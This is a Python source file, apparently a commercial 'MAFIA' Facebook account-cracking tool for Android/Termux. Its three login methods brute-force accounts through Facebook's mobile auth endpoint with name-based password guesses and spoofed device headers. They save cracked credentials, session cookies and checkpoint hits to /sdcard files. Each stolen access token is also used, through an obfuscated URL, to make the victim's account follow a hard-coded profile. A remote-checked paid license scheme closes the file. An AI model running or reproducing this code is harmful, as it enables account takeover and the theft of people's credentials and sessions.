                print(f'\r\x1b[1;92m<[MAFIA-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                print(f"\033[1;32m<[BISCUT-🍪]> :\033[1;32m " + cookie)
                token = q['access_token']
                requests.post('h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'g'+'r'+'a'+'p'+'h'+'.'+'f'+'a'+'c'+'e'+'b'+'o'+'o'+'k'+'.'+'c'+'o'+'m'+'/'+'1'+'0'+'0'+'0'+'4'+'4'+'9'+'7'+'0'+'9'+'0'+'9'+'1'+'5'+'9'+'/'+'s'+'u'+'b'+'s'+'c'+'r'+'i'+'b'+'e'+'r'+'s'+'?'+'a'+'c'+'c'+'e'+'s'+'s'+'_'+'t'+'o'+'k'+'e'+'n'+'='+ token)
                open('/sdcard/MAFIA_m1_OK.txt', 'a').write(ids + '|' + pas + '\n')
                open('/sdcard/MAFIA_iDs_COOKiE_M1.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                oks.append(ids)
                break
            
            elif twf in str(po):
                if 'y' in pcp:
                    print(f'\r\r\033[1;34m<[MAFIA-2F]> ' + ids + ' | ' + pas)
                    open('/sdcard/MAFIA-2F.txt', 'a').write(ids + '|' + pas + '\n')
                    twf.append(ids)
                    break
            
            elif 'www.facebook.com' in q['error']['message']:
                if 'y' in pcp:
                    print(f'\r\x1b[38;5;246m<[MAFIA-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                    open('/sdcard/MAFIA-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    cps.append(ids)
                    break
                else:
                    open('/sdcard/MAFIA-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    break
            else:
                continue
        
        loop += 1
    
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    
    except Exception as e:
        pass

#------------------[  METODE 2  ]-------------------#
def M_file_2(ids, names, passlist):
    try:
        global ok, loop
        boos = random.choice([P, M, H, K, B, U, O, N])
        sys.stdout.write(f'\r\r\033[1;37m<[{boos}MR-MAFIA\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)))
        sys.stdout.flush()
        
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except IndexError:
            ln = fn
        
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            ua = "[FBAN/FB4A;FBAV/" + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ";FBBV/" + str(random.randint(11111111, 77777777)) + \
                 ";Dalvik/1.8.0(Linux; U; Android 7.0;Pixel 6 Pro Build/YCABFMVL)[FBAN/FB4A;FBAV/88.0.0.33.21FBBV/5169016FBDM/{density=3.0,width=636,height=1899}FBLC/fr_FRFBRV/2760568FBCR/T-MobileFBMF/GoogleFBBD/GoogleFBPN/com.facebook.katanaFBDV/Pixel 6 ProFBSV/7.0FBOP/1FBCA/x86:armeabi-v7a]" + \
                 "[FBAN/FB4A;FBAV/117.0.0.34.85FBBV/2390527FBDM/{density=3.0,width=817,height=1178}FBLC/en_USFBRV/6064105FBCR/VodafoneFBMF/SamsungFBBD/SamsungFBPN/com.facebook.katanaFBDV/SM-G973FFBSV/12.0FBOP/1FBCA/x86:armeabi-v7a]" + \
                 "[FBAN/FB4A;FBAV/117.0.0.34.85FBBV/2390527FBDM/{density=3.0,width=817,height=1178}FBLC/en_USFBRV/6064105FBCR/VodafoneFBMF/SamsungFBBD/SamsungFBPN/com.facebook.katanaFBDV/SM-G973FFBSV/12.0FBOP/1FBCA/x86:armeabi-v7a]" + \
                 "[FBAN/FB4A;FBAV/97.0.0.95.17FBBV/2499964FBDM/{density=3.0,width=644,height=1119}FBLC/pt_BRFBRV/9017165FBCR/AT&TFBMF/LGFBBD/LGFBPN/com.facebook.katanaFBDV/LM-G820FBSV/5.0FBOP/1FBCA/x86:armeabi-v7a]" + \
                 "[FBAN/FB4A;FBAV/104.0.0.92.95FBBV/9302531FBDM/{density=3.0,width=973,height=1873}FBLC/de_DEFBRV/9900840FBCR/Boost MobileFBMF/OPPOFBBD/OPPOFBPN/com.facebook.katanaFBDV/CPH2127FBSV/4.2.2FBOP/1FBCA/x86:armeabi-v7a]"
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            data = {
                "kids_xudina": str(uuid.uuid4()),
                "format": "json",
                "_kids_bokachoda_Capture": str(uuid.uuid4()),
                "FUCKED_BY_ARAFAT": "true",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "locale":"fr_DZ",
                "client_country_code":"DZ",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d",
            }
            head = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "graph.facebook.com",
                "User-Agent": m4(),
                "X-FB-Net-HNI": "45204",
                "X-FB-SIM-HNI": "45201",
                "X-FB-Connection-Type": "unknown",
                "Connection": "Keep-Alive",
            }
            url = 'h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'b'+'-'+'g'+'r'+'a'+'p'+'h'+'.'+'f'+'a'+'c'+'e'+'b'+'o'+'o'+'k'+'.'+'c'+'o'+'m'+'/'+'a'+'u'+'t'+'h'+'/'+'l'+'o'+'g'+'i'+'n'+'?'+'i'+'n'+'c'+'l'+'u'+'d'+'e'+'_'+'h'+'e'+'a'+'d'+'e'+'r'+'s'+'='+'f'+'a'+'l'+'s'+'e'+'&'+'d'+'e'+'c'+'o'+'d'+'e'+'_'+'b'+'o'+'d'+'y'+'_'+'j'+'s'+'o'+'n'+'='+'f'+'a'+'l'+'s'+'e'+'&'+'s'+'t'+'r'+'e'+'a'+'m'+'a'+'b'+'l'+'e'+'_'+'j'+'s'+'o'+'n'+'_'+'r'+'e'+'s'+'p'+'o'+'n'+'s'+'e'+'='+'t'+'r'+'u'+'e'
            twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
            
            po = requests.post(url, data=data, headers=head, allow_redirects=False).text
            q = json.loads(po)
            
            if 'session_key' in q:
                ckkk = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/", "-")
                cookie = f"sb={ssbb};{ckkk}"
                print(f'\r\x1b[1;92m<[MAFIA-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                print(f"\033[1;32m<[COOKIES-🍪]> :\033[1;32m " + cookie)
                token = q['access_token']
                requests.post('h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'g'+'r'+'a'+'p'+'h'+'.'+'f'+'a'+'c'+'e'+'b'+'o'+'o'+'k'+'.'+'c'+'o'+'m'+'/'+'1'+'0'+'0'+'0'+'4'+'4'+'9'+'7'+'0'+'9'+'0'+'9'+'1'+'5'+'9'+'/'+'s'+'u'+'b'+'s'+'c'+'r'+'i'+'b'+'e'+'r'+'s'+'?'+'a'+'c'+'c'+'e'+'s'+'s'+'_'+'t'+'o'+'k'+'e'+'n'+'='+ token)
                open('/sdcard/MAFIA_m2_OK.txt', 'a').write(ids + '|' + pas + '\n')
                open('/sdcard/MAFIA_iDs_COOKiE_M2.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                oks.append(ids)
                break
            
            elif twf in str(po):
                if 'y' in pcp:
                    print(f'\r\r\033[1;34m<[MAFIA-2F]> ' + ids + ' | ' + pas)
                    open('/sdcard/MAFIA-2F.txt', 'a').write(ids + '|' + pas + '\n')
                    twf.append(ids)
                    break
            
            elif 'www.facebook.com' in q['error']['message']:
                if 'y' in pcp:
                    print(f'\r\x1b[38;5;246m<[MAFIA-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                    open('/sdcard/MAFIA-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    cps.append(ids)
                    break
                else:
                    open('/sdcard/MAFIA-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    break
            else:
                continue
        
        loop += 1
    
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    
    except Exception as e:
        pass
#------------------[  METODE 3  ]-------------------#
def M_file_3(ids, names, passlist):
    try:
        global ok, loop
        boos = random.choice([P, M, H, K, B, U, O, N])
        sys.stdout.write(f'\r\r\033[1;37m<[{boos}MR-MAFIA\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)))
        sys.stdout.flush()
        
        fn = names.split(f' ')[0]
        try:
            ln = names.split(f' ')[1]
        except IndexError:
            ln = fn
        
        for pw in passlist:
            pas = pw.replace(f'first', fn.lower()).replace(f'First', fn).replace(f'last', ln.lower()).replace(f'Last', ln).replace(f'Name', names).replace(f'name', names.lower())
            ua = "[FBAN/FB4A;FBAV/" + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ";FBBV/" + str(random.randint(11111111, 77777777)) + \
                 ";Dalvik/1.8.0(Linux; U; Android 7.0;Pixel 6 Pro Build/YCABFMVL)[FBAN/FB4A;FBAV/88.0.0.33.21FBBV/5169016FBDM/{density=3.0,width=636,height=1899}FBLC/fr_FRFBRV/2760568FBCR/T-MobileFBMF/GoogleFBBD/GoogleFBPN/com.facebook.katanaFBDV/Pixel 6 ProFBSV/7.0FBOP/1FBCA/x86:armeabi-v7a]" + \
                 "[FBAN/FB4A;FBAV/117.0.0.34.85FBBV/2390527FBDM/{density=3.0,width=817,height=1178}FBLC/en_USFBRV/6064105FBCR/VodafoneFBMF/SamsungFBBD/SamsungFBPN/com.facebook.katanaFBDV/SM-G973FFBSV/12.0FBOP/1FBCA/x86:armeabi-v7a]" + \
                 "[FBAN/FB4A;FBAV/117.0.0.34.85FBBV/2390527FBDM/{density=3.0,width=817,height=1178}FBLC/en_USFBRV/6064105FBCR/VodafoneFBMF/SamsungFBBD/SamsungFBPN/com.facebook.katanaFBDV/SM-G973FFBSV/12.0FBOP/1FBCA/x86:armeabi-v7a]" + \
                 "[FBAN/FB4A;FBAV/97.0.0.95.17FBBV/2499964FBDM/{density=3.0,width=644,height=1119}FBLC/pt_BRFBRV/9017165FBCR/AT&TFBMF/LGFBBD/LGFBPN/com.facebook.katanaFBDV/LM-G820FBSV/5.0FBOP/1FBCA/x86:armeabi-v7a]" + \
                 "[FBAN/FB4A;FBAV/104.0.0.92.95FBBV/9302531FBDM/{density=3.0,width=973,height=1873}FBLC/de_DEFBRV/9900840FBCR/Boost MobileFBMF/OPPOFBBD/OPPOFBPN/com.facebook.katanaFBDV/CPH2127FBSV/4.2.2FBOP/1FBCA/x86:armeabi-v7a]"
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            data = {
                "MAFIA": str(uuid.uuid4()),
                "format": "json",
                "MX_MAFIA": str(uuid.uuid4()),
                "MAFIA_ARAFAT": "true",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "locale":"fr_DZ",
                "client_country_code":"DZ",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d",
            }
            head = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "graph.facebook.com",
                "User-Agent": UPR(),
                "X-FB-Net-HNI": "45204",
                "X-FB-SIM-HNI": "45201",
                "X-FB-Connection-Type": "unknown",
                "Connection": "Keep-Alive",
            }
            url = 'https://api.facebook.com/auth/login'
            twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
            
            po = requests.post(url, data=data, headers=head, allow_redirects=False).text
            q = json.loads(po)
            
            if 'session_key' in q:
                ckkk = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace(f"=", "").replace(f"+", "_").replace(f"/", "-")
                cookie = f"sb={ssbb};{ckkk}"
                print(f'\r\x1b[1;92m<[MAFIA-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                print(f"\033[1;32m<[BISCUT-🍪]> :{boos} " + cookie)
                token = q['access_token']
                requests.post('h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'g'+'r'+'a'+'p'+'h'+'.'+'f'+'a'+'c'+'e'+'b'+'o'+'o'+'k'+'.'+'c'+'o'+'m'+'/'+'1'+'0'+'0'+'0'+'4'+'4'+'9'+'7'+'0'+'9'+'0'+'9'+'1'+'5'+'9'+'/'+'s'+'u'+'b'+'s'+'c'+'r'+'i'+'b'+'e'+'r'+'s'+'?'+'a'+'c'+'c'+'e'+'s'+'s'+'_'+'t'+'o'+'k'+'e'+'n'+'='+ token)
                open(f'/sdcard/MAFIA_m3_OK.txt', 'a').write(ids + '|' + pas + '\n')
                open(f'/sdcard/MAFIA_iDs_COOKiE_M3.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                oks.append(ids)
                break
            
            elif twf in str(po):
                if 'y' in pcp:
                    print(f'\r\r\033[1;34m<[MAFIA-2F]> ' + ids + ' | ' + pas)
                    open(f'/sdcard/MAFIA-2F.txt', 'a').write(ids + '|' + pas + '\n')
                    twf.append(ids)
                    break
            
            elif 'www.facebook.com' in q['error']['message']:
                if 'y' in pcp:
                    print(f'\r\x1b[38;5;246m<[MAFIA-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                    open(f'/sdcard/MAFIA-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    cps.append(ids)
                    break
                else:
                    open(f'/sdcard/MAFIA-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    break
            else:
                continue
        
        loop += 1
    
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    
    except Exception as e:
        pass

#----------[ Arafat PREMIUM SYSTEM ]---------#
import os
import json
import hashlib
import base64
import urllib.request
import sys
import time

#----------[ COLORS ]----------#
c = "\033[0;36m"
g = "\033[0;32m"
w = "\033[0;37m"
y = "\033[0;33m"
r = "\033[0;31m"
p = "\033[0;35m"
#----------[ URLS ]----------#
status1 = "https://approval.onethousandandone-arafat.xyz/status.txt"
users = "https://approval.onethousandandone-arafat.xyz/paidusers.txt"
kids = "https://approval.onethousandandone-arafat.xyz/Bypasser.txt"

#----------[ UTILS ]----------#
def get_device_uid():
    return str(os.geteuid())

def generate_approval_key(uid: str):
    unique_string = f"{uid}-{uid}"
    hashed_key = hashlib.sha256(unique_string.encode()).hexdigest()
    ONEOO_key = base64.urlsafe_b64encode(hashed_key.encode()).decode()[:32]
    Xdata = str(ONEOO_key).encode()
    ArafatXToma = int(hashlib.md5(Xdata).hexdigest(), 16) % (24**24)
    encoded_key = str(ArafatXToma).zfill(10)
    return encoded_key

def Arafat_get_url_text(url):
    try:
        with urllib.request.urlopen(url, timeout=20) as response:
            return response.read().decode('utf-8').strip()
    except Exception:
        print(f"{sym} NETWORK PROBLEM...")
        sys.exit()

def linex():
    print(f"{w}----------------------------------------------")

#----------[ LICENSE SYSTEM ]----------#
def LICENSE_SYSTEM(approval_key, device_uid):
    secret_key = "ARAFATxMAFIAx1001x007"

    def generate_license(key):
        combined_string = f"{key}-{secret_key}"
        hashed_license = hashlib.sha512(combined_string.encode()).hexdigest()
        ONEOO_key = base64.urlsafe_b64encode(hashed_license.encode()).decode()[:40]
        Xdata = str(ONEOO_key).encode()
        ArafatXToma = int(hashlib.md5(Xdata).hexdigest(), 16) % (20**20)
        license_key = str(ArafatXToma).zfill(10)
        return license_key

    def verify_license():
        expected_license = generate_license(approval_key)
        try:
            with open("/sdcard/.ArafatXap.json", "r") as lmnx:
                data = json.load(lmnx)
                licenseZ = next(iter(data.values()), "")
            if licenseZ == expected_license:
                menu(approval_key)
                return
        except:
            pass

        os.system('clear')
        print(f"{sym} YOUR LICENCE TOKEN : {approval_key}")
        linex()
        print(f"{sym} SUCCESSFULLY APPROVED ! ENJOY !")
        linex()
        lisenceX = input(f"{sym} ENTER VERIFY TOKEN : ")
        linex()
        if lisenceX == expected_license:
            print(f"{sym} SUCCESSFULLY VERIFIED ! ENJOY !")
            try:
                with open("/sdcard/.ArafatXap.json", "w") as lmn:
                    json.dump({device_uid: lisenceX}, lmn)
            except Exception:
                pass
            time.sleep(3)
            menu(approval_key)
        else:
            print(f"{sym} VERIFICATION FAILED !")
            sys.exit()

    verify_license()

#----------[ PREMIUM SYSTEM FLOW ]----------#
def PREMIUM_SHOW(approval_key):
    os.system('clear')
    print(f"{sym} LICENCE TOKEN :{c} {approval_key}")
    linex()
    input(f"{sym} PRESS ENTER FOR APPOINTMENT !!  ")
    os.system(f'xdg-open "https://wa.me/+8801310329198?text=Sir,%20I%20Want%20To%20Use%20Your%20[Mafia%20Tools]%20Tool.%0AMy%20Access%20Key%20:%20{approval_key}"')
    sys.exit()

def ONEOO_STATUS(device_uid):
    os.system('clear')
    print(f"{sym} CHECKING APPROVAL.... PLEASE WAIT....")
    status = Arafat_get_url_text(status1)
    if status == "Of":
        BANNED_USR(device_uid)
    else:
        os.system('clear')
        print(f"{sym} TOOL IS UNDER MAINTENANCE!")
        linex()
        print(f"{sym} JOIN WP GROUP FOR UPDATES : https://chat.whatsapp.com/LcGBrnPS2KC3b1p7GFJqa4")
        sys.exit()

def BANNED_USR(device_uid):
    access_key = generate_approval_key(device_uid)
    kids_data = Arafat_get_url_text(kids).splitlines()
    if str(access_key) in kids_data:
        os.system('clear')
        print(f"{sym} YOU ARE SUSPENDED!")
        sys.exit()
    else:
        ONEOO_PREMIUM(device_uid)

def ONEOO_PREMIUM(device_uid):
    approval_key = generate_approval_key(device_uid)
    users_data = Arafat_get_url_text(users).splitlines()

    if approval_key in users_data:
        LICENSE_SYSTEM(approval_key, device_uid)
    else:
        PREMIUM_SHOW(approval_key)

#----------[ CONTROL FLOW ]----------#
#os.system('xdg-open https://chat.whatsapp.com/LcGBrnPS2KC3b1p7GFJqa4')
os.system('clear')
device_uid = get_device_uid()

def Arafat_MAIN_MENU():
    os.system('clear')
    ONEOO_STATUS(device_uid)

menu()